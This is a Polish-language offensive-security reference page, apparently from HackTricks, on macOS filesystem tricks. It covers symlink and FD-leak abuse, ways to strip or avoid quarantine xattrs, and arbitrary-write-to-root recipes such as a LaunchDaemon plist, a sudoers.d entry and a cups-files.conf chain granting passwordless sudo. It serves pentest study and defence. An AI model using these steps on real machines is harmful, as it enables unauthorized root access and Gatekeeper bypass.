# Sztuczki FS w macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinacje uprawnień POSIX

W przypadku **katalogu** trzy bity uprawnień oznaczają coś innego niż w przypadku zwykłego pliku. `chmod(1)` określa bit wykonania jako "**search**", gdy jest stosowany do katalogu:<sup>[[2]](#references)</sup>

> `0100` W przypadku plików zezwala właścicielowi na wykonanie. W przypadku katalogów zezwala właścicielowi na **wyszukiwanie** w katalogu.

- **odczyt** - możesz **wyliczać** wpisy katalogu (wyświetlać nazwy).
- **zapis** - możesz **tworzyć, zmieniać nazwy i usuwać wpisy** w katalogu. Zauważ, że jest to właściwość *zawierającego* katalogu, a nie pliku: możesz usunąć plik, którego nie możesz odczytać ani zapisać, o ile możesz zapisywać w jego katalogu nadrzędnym.
- Aby usunąć **podkatalog**, musi on być pusty, co z kolei wymaga wystarczających uprawnień do usunięcia całej jego zawartości.
- Jeśli katalog ma **sticky bit** (`S_ISVTX`, tak jak `/tmp`), obowiązuje ograniczenie — POSIX stwierdza, że proces może wtedy usuwać lub zmieniać nazwy plików tylko wtedy, gdy jest ich właścicielem, jest właścicielem katalogu lub ma odpowiednie uprawnienia.<sup>[[1]](#references)</sup>
- **wykonanie / wyszukiwanie** - masz **zezwolenie na przechodzenie** przez katalog. Rozwiązywanie nazw ścieżek lokalizuje każdy komponent „w katalogu określonym przez jego poprzednik”, więc **utrata uprawnień do wyszukiwania w dowolnym pojedynczym komponencie prefiksu ścieżki sprawia, że wszystko poniżej staje się niedostępne za pomocą ścieżki**, nawet jeśli sam plik końcowy jest odczytywalny dla wszystkich.<sup>[[1]](#references)</sup>

### Niebezpieczne kombinacje

**Jak nadpisać plik/katalog należący do root**, gdy:

- Właścicielem jednego z nadrzędnych **katalogów** w ścieżce jest użytkownik
- Właścicielem jednego z nadrzędnych **katalogów** w ścieżce jest **grupa użytkowników** z **prawem zapisu**
- **Grupa** użytkowników ma **prawo zapisu** do **pliku**

W przypadku dowolnej z powyższych kombinacji attacker może **wstrzyknąć** **sym/hard link** w oczekiwanej ścieżce, aby uzyskać uprzywilejowany dowolny zapis.

### Szczególny przypadek katalogu root R+X

Wynika to bezpośrednio z opisanej powyżej reguły rozwiązywania nazw ścieżek. Jeśli **katalog przyznaje root wyłącznie R+X**, pliki znajdujące się w jego wnętrzu są *niedostępne za pomocą ścieżki* dla wszystkich innych — ale ich własne bity uprawnień mogą nadal być liberalne. Katalog jest jedyną przeszkodą.

Zatem każdy mechanizm, który pozwala przenieść plik **poza ten katalog** — uprzywilejowany proces, który **przenosi/zmienia nazwę/kopiuje** ścieżkę wybraną przez attackera do lokalizacji, przez którą możesz przechodzić — staje się dowolnym odczytem bez konieczności pokonywania własnego trybu uprawnień pliku:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Szukaj uprzywilejowanych procesów przenoszących pliki (instalatorów, rotatorów logów, collectorów awarii/diagnostyki, funkcji backupu i „exportu”), które akceptują ścieżkę źródłową od użytkownika o niższych uprawnieniach.

## Symbolic Link / Hard Link

### Permissive file/folder

Jeśli uprzywilejowany proces zapisuje dane w **file**, który może być **kontrolowany** przez **lower privileged user** albo który mógł zostać **wcześniej utworzony** przez użytkownika o niższych uprawnieniach. Użytkownik może po prostu **wskazać go na inny plik** za pomocą Symbolic lub Hard link, a uprzywilejowany proces zapisze dane w tym pliku.

Sprawdź pozostałe sekcje, aby znaleźć miejsca, w których atakujący może **abuse an arbitrary write to escalate privileges**.

### Open `O_NOFOLLOW`

Zgodnie z [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Sprawdzany jest tylko **końcowy** komponent — wszystkie **pośrednie** komponenty są nadal rozwiązywane i śledzone. Dlatego deweloper, który „zabezpieczył” zapis za pomocą `O_NOFOLLOW`, nadal może zostać zaatakowany poprzez umieszczenie symlinku w dowolnym **katalogu nadrzędnym** ścieżki docelowej.<sup>[[3]](#references)</sup>

Ta sama strona man opisuje flagi, które faktycznie zamykają tę lukę:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

W przeciwnym razie `openat()` względem deskryptora katalogu, który został już zweryfikowany, albo `realpath()` + ponowna walidacja to pozostałe sposoby na zatrzymanie podmiany symlinku w środku ścieżki.

## .fileloc

Pliki z rozszerzeniem **`.fileloc`** mogą wskazywać na inne aplikacje lub pliki binarne, więc po ich otwarciu zostanie wykonana wskazana aplikacja/binary.\
Przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Jeśli wywołanie `open` nie zawiera flagi `O_CLOEXEC`, file descriptor zostanie odziedziczony przez proces potomny. Jeśli więc uprzywilejowany proces otworzy uprzywilejowany plik i uruchomi proces kontrolowany przez atakującego, atakujący **odziedziczy FD do uprzywilejowanego pliku**.

Klasycznym przykładem jest **`DYLD_PRINT_TO_FILE` LPE w OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` respektował `DYLD_PRINT_TO_FILE=/path` nawet w **restricted (suid root) binaries**, ponieważ ta konkretna zmienna była parsowana poza `processDyldEnvironmentVariable()`.
- Wykonywał `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, więc **tworzył plik należący do roota pod dowolną ścieżką**.
- FD **nigdy nie był zamykany i nie miał flagi close-on-exec**, więc każdy proces potomny suid binary dziedziczył **zapisywalny FD do pliku należącego do roota**.
- Uruchomienie np. `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, a następnie odczytanie odziedziczonego numeru FD w procesie potomnym umożliwiało dowolny zapis do pliku należącego do roota; `fcntl(fd, F_SETFL, 0)` usuwało nawet `O_APPEND`, pozwalając nadpisywać plik zamiast dopisywać do niego.

Ten sam schemat występuje zawsze, gdy uprzywilejowany proces otwiera plik **przed** wykonaniem `exec` czegoś, co kontrolujesz (narzędzia pomocnicze, edytory wywoływane przez `$EDITOR` w stylu `crontab`, pliki logów/debug otwierane ze ścieżki pochodzącej ze zmiennej środowiskowej...). Wylicz odziedziczone FD za pomocą:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Anything powyżej `2`, co wskazuje na plik, którego nie możesz samodzielnie otworzyć, jest prymitywem arbitrary-write (lub arbitrary-read).

## Unikaj trików z quarantine xattrs

### Usuń je
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### flaga uchg / uchange / uimmutable

Jeśli plik/folder ma ten atrybut immutable, nie będzie można umieścić na nim xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Systemy plików bez obsługi xattr

Nie każdy system plików, który macOS może zamontować, natywnie przechowuje **extended attributes**. HFS+ i APFS je obsługują; **FAT32, exFAT oraz (większość) montowań NFS — nie** — macOS emuluje je, zapisując dodatkowy plik **AppleDouble** o nazwie `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Ma to znaczenie w przypadku quarantine, ponieważ xattr przetrwa tylko wtedy, gdy można go faktycznie zapisać **i ponownie odczytać** z tego samego woluminu:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Jeśli wolumin zostanie później odczytany za pośrednictwem ścieżki ignorującej plik towarzyszący `._` (lub plik towarzyszący zostanie usunięty), plik dotrze **bez flagi kwarantanny** — a nieobjęty kwarantanną `.app` wystarczy, aby ominąć App Sandbox, jak opisano w [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Ta ACL uniemożliwia dodawanie `xattrs` do pliku
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Format pliku **AppleDouble** kopiuje plik wraz z jego ACEs.

W [**kodzie źródłowym**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) można zobaczyć, że tekstowa reprezentacja ACL przechowywana wewnątrz xattr o nazwie **`com.apple.acl.text`** zostanie ustawiona jako ACL w zdekompresowanym pliku. Jeśli więc skompresujesz aplikację do pliku zip w formacie **AppleDouble** z ACL, które uniemożliwia zapisanie innych xattrs... xattr quarantine nie zostanie ustawiony w aplikacji:

Sprawdź [**oryginalny raport**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/), aby uzyskać więcej informacji.<sup>[[6]](#references)</sup>

Aby to odtworzyć, musimy najpierw uzyskać poprawny ciąg ACL:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Zauważ, że nawet jeśli to działa, sandbox wcześniej zapisuje quarantine xattr)

Niekonieczne, ale pozostawiam to na wszelki wypadek:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass kontroli sygnatur

### Bypass kontroli platform binaries

Niektóre kontrole bezpieczeństwa sprawdzają, czy binary jest **platform binary**, na przykład aby zezwolić na połączenie z usługą XPC. Jednak, jak pokazano w jednym z bypassów opisanych na stronie https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, możliwe jest ominięcie tej kontroli przez pobranie platform binary (takiego jak /bin/ls) i wstrzyknięcie exploita za pośrednictwem dyld przy użyciu zmiennej środowiskowej `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Bypass flag `CS_REQUIRE_LV` i `CS_FORCED_LV`

Wykonujący się binary może zmodyfikować własne flagi, aby ominąć kontrole, używając kodu takiego jak:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Ominięcie podpisów kodu

Bundles zawierają plik **`_CodeSignature/CodeResources`**, który zawiera **hash** każdego pojedynczego **pliku** w **bundle**. Należy pamiętać, że hash pliku CodeResources jest również **osadzony w pliku wykonywalnym**, więc jego także nie możemy modyfikować.

Istnieją jednak pliki, których podpis nie będzie sprawdzany — mają one klucz omit w plist, na przykład:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Możliwe jest obliczenie podpisu zasobu z poziomu CLI za pomocą:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montowanie dmg

Użytkownik może zamontować niestandardowy dmg utworzony nawet na niektórych istniejących folderach. W ten sposób można utworzyć niestandardowy pakiet dmg z własną zawartością:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Zwykle macOS montuje dyski, komunikując się z usługą Mach `com.apple.DiskArbitrarion.diskarbitrariond` (udostępnianą przez `/usr/libexec/diskarbitrationd`). Jeśli dodasz parametr `-d` do pliku plist LaunchDaemons i uruchomisz usługę ponownie, będzie ona zapisywać logi w `/var/log/diskarbitrationd.log`.\
Możliwe jest jednak użycie narzędzi takich jak `hdik` i `hdiutil` do bezpośredniej komunikacji z kext `com.apple.driver.DiskImages`.

## Arbitrary Writes

### Periodic sh scripts

Jeśli Twój skrypt może zostać zinterpretowany jako **shell script**, możesz nadpisać **`/etc/periodic/daily/999.local`**, który będzie uruchamiany codziennie.

Możesz **zasymulować wykonanie tego skryptu** za pomocą: **`sudo periodic daily`**

### Daemons

Utwórz dowolny **LaunchDaemon**, taki jak **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, zawierający plist wykonujący dowolny skrypt, na przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Wygeneruj skrypt `/Applications/Scripts/privesc.sh` zawierający **polecenia**, które chcesz uruchomić jako root.

### Plik Sudoers

Jeśli masz **arbitrary write**, możesz utworzyć plik w folderze **`/etc/sudoers.d/`**, przyznający Ci uprawnienia **sudo**.

### Pliki PATH

Plik **`/etc/paths`** jest jednym z głównych miejsc, które uzupełniają zmienną środowiskową PATH. Aby go nadpisać, musisz być rootem, ale jeśli skrypt uruchamiany przez **privileged process** wykonuje jakieś **polecenie bez pełnej ścieżki**, możesz być w stanie je **hijackować**, modyfikując ten plik.

Możesz również zapisywać pliki w **`/etc/paths.d`**, aby dodawać nowe foldery do zmiennej środowiskowej `PATH`.

### cups-files.conf

Ta technika została wykorzystana w [tym opisie](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Utwórz plik `/etc/cups/cups-files.conf` z następującą zawartością:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Spowoduje to utworzenie pliku `/etc/sudoers.d/lpe` z uprawnieniami 777. Dodatkowe śmieci na końcu służą do wywołania utworzenia logu błędów.

Następnie zapisz w `/etc/sudoers.d/lpe` wymaganą konfigurację do eskalacji uprawnień, taką jak `%staff ALL=(ALL) NOPASSWD:ALL`.

Następnie ponownie zmodyfikuj plik `/etc/cups/cups-files.conf`, ustawiając `LogFilePerm 700`, aby nowy plik sudoers stał się prawidłowy po wywołaniu `cupsctl`.

### Sandbox Escape

Możliwe jest wydostanie się z macOS sandbox przy użyciu FS arbitrary write. Przykłady znajdziesz na stronie [macOS Auto Start](../../../../macos-auto-start-locations.md), ale często stosowaną metodą jest zapisanie pliku preferencji Terminala w `~/Library/Preferences/com.apple.Terminal.plist`, który wykonuje polecenie podczas uruchamiania, a następnie wywołanie go za pomocą `open`.

## Tworzenie zapisywalnych plików jako inni użytkownicy

Bardzo częstym privesc primitive jest nakłonienie **privileged process do utworzenia pliku** w kontrolowanym przez Ciebie katalogu, a następnie zachowanie **write access** do tego pliku. Potrzebne są dwa elementy:

1. Katalog, którego jesteś właścicielem (lub w którym możesz ustawić **inheritable ACL**), aby wszystko utworzone w jego obrębie dziedziczyło Twoje uprawnienia.
2. Proces `privileged`/`suid`, któremu można wskazać, **gdzie** ma utworzyć plik — zazwyczaj za pośrednictwem zmiennej środowiskowej debugowania/logowania, pliku konfiguracyjnego lub interfejsu XPC helpera.

To właśnie część dotycząca **inheritable ACL** sprawia, że utworzony plik jest zapisywalny przez Ciebie, mimo że jego właścicielem jest inny użytkownik. Flagi dziedziczenia `file_inherit` / `directory_inherit` są opisane w [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Teraz każdy plik utworzony przez uprzywilejowany proces wewnątrz `$DIRNAME` jest **zapisywalny przez ciebie**. Jeśli ten katalog jest również lokalizacją, z której później wykonywany jest kod jako **root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, katalog LaunchDaemon...), jest to bezpośrednia eskalacja uprawnień do root. Zobacz sekcje [Sudoers File](#sudoers-file) i [cups-files.conf](#cups-filesconf) powyżej, aby dowiedzieć się, co zapisać po uzyskaniu pliku.

Pełny przykład łańcucha „zmienna środowiskowa powoduje, że proces root tworzy plik, a FD wycieka do ciebie” znajdziesz powyżej w sekcji [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## POSIX Shared Memory

**POSIX shared memory** umożliwia procesom w systemach operacyjnych zgodnych z POSIX dostęp do wspólnego obszaru pamięci, zapewniając szybszą komunikację w porównaniu z innymi metodami komunikacji międzyprocesowej. Polega na utworzeniu lub otwarciu obiektu pamięci współdzielonej za pomocą `shm_open()`, ustawieniu jego rozmiaru za pomocą `ftruncate()` oraz zmapowaniu go w przestrzeni adresowej procesu przy użyciu `mmap()`. Procesy mogą następnie bezpośrednio odczytywać dane z tego obszaru pamięci i zapisywać je do niego. Aby zarządzać równoczesnym dostępem i zapobiegać uszkodzeniu danych, często używa się mechanizmów synchronizacji, takich jak mutexy lub semafory. Na końcu procesy odmapowują i zamykają pamięć współdzieloną za pomocą `munmap()` i `close()`, a opcjonalnie usuwają obiekt pamięci za pomocą `shm_unlink()`. System ten jest szczególnie skuteczny w zapewnianiu wydajnej i szybkiej komunikacji IPC w środowiskach, w których wiele procesów musi szybko uzyskiwać dostęp do współdzielonych danych.

<details>

<summary>Przykład kodu producenta</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Przykład kodu konsumenta</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** to funkcja bezpieczeństwa wprowadzona w macOS w celu zwiększenia bezpieczeństwa i niezawodności operacji na **file descriptorach** w aplikacjach użytkownika. Te guarded descriptors umożliwiają powiązanie określonych ograniczeń lub „guardów” z file descriptorami, które są egzekwowane przez kernel.

Ta funkcja jest szczególnie przydatna w zapobieganiu określonym klasom podatności, takim jak **nieautoryzowany dostęp do plików** lub **race conditions**. Podatności te występują na przykład wtedy, gdy jeden wątek uzyskuje dostęp do file description, zapewniając **innemu podatnemu wątkowi dostęp do niego**, lub gdy file descriptor zostaje **odziedziczony** przez podatny proces potomny. Niektóre funkcje związane z tą funkcjonalnością to:

- `guarded_open_np`: Otwiera FD z guardem
- `guarded_close_np`: Zamyka go
- `change_fdguard_np`: Zmienia flagi guarda na deskryptorze (może nawet usunąć ochronę guarda)

## References

- [1] [POSIX.1-2024 — Definicje bazowe, rozdz. 4 (Uprawnienia dostępu do plików, Ochrona katalogów, Rozwiązywanie nazw ścieżek)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [Strona man [`chmod(1)`]](https://keith.github.io/xcode-man-pages/chmod.1.html) (bit wyszukiwania/wykonywania katalogu, flagi dziedziczenia ACL)
- [3] [Strona man [`open(2)`]](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (wyciek FD bez close-on-exec)
- [5] [The Eclectic Light Company - Które systemy plików i cloud services zachowują extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Achillesowa pięta Gatekeepera: odkrycie podatności w macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
